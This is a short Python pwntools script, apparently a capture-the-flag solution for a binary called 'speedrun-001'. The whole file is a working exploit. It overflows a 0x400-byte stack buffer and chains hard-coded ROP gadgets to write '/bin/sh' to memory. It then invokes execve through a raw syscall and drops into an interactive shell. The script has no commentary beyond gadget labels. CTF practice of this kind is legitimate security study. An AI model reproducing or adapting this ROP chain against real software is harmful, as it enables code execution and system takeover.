'''
Author: Samrito
Date: 2021-12-23 19:11:26
LastEditors: Samrito
LastEditTime: 2021-12-23 19:25:58
'''
from pwn import *

io = process(argv=['./speedrun-001'])
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

str_addr = 0x6bc000
mov_gadage = 0x048d251 # mov qword ptr [rax], rdx; ret; 
pop_rdx_ret = 0x044be16
pop_rsi_ret = 0x04101f3
pop_rdi_ret = 0x0400686
pop_rax_ret = 0x0415664
syscall_addr = 0x040129c

#debug('b * 0x400bab')
io.recvuntil('Any last words?\n')
payload = flat([b'\x00'*(0x400+8),pop_rax_ret, str_addr, pop_rdx_ret, 0x0068732f6e69622f, mov_gadage, pop_rax_ret, 0x3b, pop_rdi_ret, str_addr, pop_rsi_ret, 0, pop_rdx_ret, 0,syscall_addr])
io.sendline(payload)

io.interactive()
